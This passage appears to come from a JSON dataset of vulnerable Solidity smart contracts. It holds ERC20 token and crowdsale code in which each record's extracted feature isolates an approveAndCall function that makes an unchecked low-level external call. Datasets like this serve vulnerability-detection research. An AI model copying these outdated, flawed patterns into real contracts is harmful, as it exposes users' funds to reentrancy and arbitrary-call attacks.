withdraw() public {\n require(msg.sender == owner);\n msg.sender.transfer((address(this)).balance);\n }\n function() payable public {\n require(msg.value >= 100 finney);\n uint256 exrnBuying = (msg.value * rate) / 1e18;\n uint256 exrnBought = 0;\n uint256 exrnAvailable = token.balanceOf(address(this));\n uint256 returningEth = 0;\n if (exrnAvailable == 0)\n revert();\n bool saleFinished = false;\n if (exrnBuying >= exrnAvailable) {\n saleFinished = true;\n Finish();\n }\n if (exrnBuying > exrnAvailable) {\n returningEth = ((exrnBuying - exrnAvailable) * 1e18) / rate;\n exrnBuying = exrnAvailable;\n }\n exrnBought = exrnBuying;\n token.transfer(msg.sender, exrnBought);\n if (returningEth > 0)\n msg.sender.transfer(returningEth);\n Purchase(msg.sender, exrnBought, returningEth);\n }\n function ExrnSale() public {\n owner = msg.sender;\n Start();\n }\n event Start();\n event Purchase(address indexed _buyer, uint256 _exrnBought, uint256 _ethReturned);\n event Finish();\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b9"
  },
  "filename": "35487.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15ba"
  },
  "filename": "35511.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 50000000;\n totalSupply = 50000000;\n name = \"NUMIDIA\";\n decimals = 3;\n symbol = \"NMD\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15bb"
  },
  "filename": "35518.sol",
  "content": "pragma solidity ^0.4.15;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MRAToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MRAToken(\n ) {\n decimals = 18;\n totalSupply = 100000000 * (10 ** uint256(decimals));\n balances[msg.sender] = totalSupply;\n name = \"MRAToken\";\n symbol = \"MRAT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Crowdsale is Ownable {\n using SafeMath for uint256;\n MRAToken public token;\n uint256 public startTime = 1507782600;\n uint256 public phase_1_Time = 1512104399;\n uint256 public phase_2_Time = 1513400399;\n uint256 public phase_3_Time = 1514782799;\n uint256 public phase_4_Time = 1516078799;\n uint256 public phase_5_Time = 1517461199;\n uint256 public endTime = 1518757199;\n address public wallet;\n uint256 public phase_1_rate = 28900;\n uint256 public phase_2_rate = 1156;\n uint256 public phase_3_rate = 760;\n uint256 public phase_4_rate = 545;\n uint256 public phase_5_rate = 328;\n uint256 public phase_6_rate = 231;\n uint256 public weiRaised;\n mapping (address => uint256) rates;\n function getRate() constant returns (uint256){\n uint256 current_time = now;\n if(current_time > startTime && current_time < phase_1_Time){\n return phase_1_rate;\n }\n else if(current_time > phase_1_Time && current_time < phase_2_Time){\n return phase_2_rate;\n }\n else if(current_time > phase_2_Time && current_time < phase_3_Time){\n return phase_3_rate;\n }\n else if(current_time > phase_3_Time && current_time < phase_4_Time){\n return phase_4_rate;\n }\n else if(current_time > phase_4_Time && current_time < phase_5_Time){\n return phase_5_rate;\n }else{\n return phase_6_rate;\n }\n }\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale() {\n wallet = msg.sender;\n token = createTokenContract();\n }\n function createTokenContract() internal returns (MRAToken) {\n return new MRAToken();\n }\n function () payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(getRate());\n weiRaised = weiRaised.add(weiAmount);\n token.transfer(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n function validPurchase() internal constant returns (bool) {\n bool withinPeriod = now >= startTime && now <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return withinPeriod && nonZeroPurchase;\n }\n function hasEnded() public constant returns (bool) {\n return now > endTime;\n }\n function destroy() onlyOwner {\n uint256 balance = token.balanceOf(this);\n assert (balance > 0);\n token.transfer(owner,balance);\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15bc"
  },
  "filename": "35533.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PapaBear is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PapaBear(\n ) {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"PapaBear\";\n decimals = 4;\n symbol = \"PAPA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15bd"
  },
  "filename": "35545.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract NEKO is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NEKO(\n ) {\n balances[msg.sender] = 2000000000000;\n totalSupply = 2000000000000;\n name = \"Ne.ko\";\n decimals = 4;\n symbol = \"NEKO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15be"
  },
  "filename": "35547.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\nfunction totalSupply() constant returns (uint256 supply) {}\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\nif (balances[msg.sender] >= _value && _value > 0) {\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nTransfer(msg.sender, _to, _value);\nreturn true;\n} else { return false; }\n}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\nif (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nTransfer(_from, _to, _value);\nreturn true;\n} else { return false; }\n}\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\nreturn balances[_owner];\n}\nfunction approve(address _spender, uint256 _value) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n}\ncontract POPcoin is StandardToken {\nfunction () {\nthrow;\n}\nstring public name = 'POPcoin';\nuint8 public decimals = 3;\nstring public symbol = 'POPN';\nstring public version = 'H1.0';\nfunction POPcoin(\n) {\nbalances[msg.sender] = 777000000000000000000000;\ntotalSupply = 777000000000000000000000;\nname = 'POPcoin';\ndecimals = 18;\nsymbol = 'POPN';\n}\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15bf"
  },
  "filename": "35565.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function xapo(\n ) {\n balances[msg.sender] = 7000000;\n totalSupply = 7000000;\n name = \"xapo\";\n decimals = 4;\n symbol = \"XPO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c0"
  },
  "filename": "35566.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HawalaMain is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function HawalaMain(\n ) {\n balances[msg.sender] = 3946744073709551615;\n totalSupply = 3946744073709551615;\n name = \"Hawala Contract\";\n decimals = 12;\n symbol = \"HAT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c1"
  },
  "filename": "35580.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n ) {\n balances[msg.sender] = 100000000000;\n totalSupply = 100000000000;\n name = \"EXRP Network Original\";\n decimals = 0;\n symbol = \"EXRN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c2"
  },
  "filename": "35588.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) 